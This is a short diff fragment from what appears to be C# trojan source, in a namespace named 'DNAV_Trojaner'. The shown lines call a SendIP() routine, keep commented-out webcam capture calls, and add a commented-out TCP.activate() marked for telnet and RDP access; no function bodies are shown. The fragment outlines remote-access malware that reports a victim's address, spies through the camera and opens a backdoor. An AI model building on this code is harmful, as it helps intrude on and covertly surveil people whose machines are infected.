@@ -40,7 +40,9 @@ namespace DNAV_Trojaner {
             // Cam.Start();
             // System.Threading.Thread.Sleep(10000);
             // Cam.Stop();
+            
             SendIP();
+            //TCP.activate(); //?telnet + RDP 
         }
     }
 }
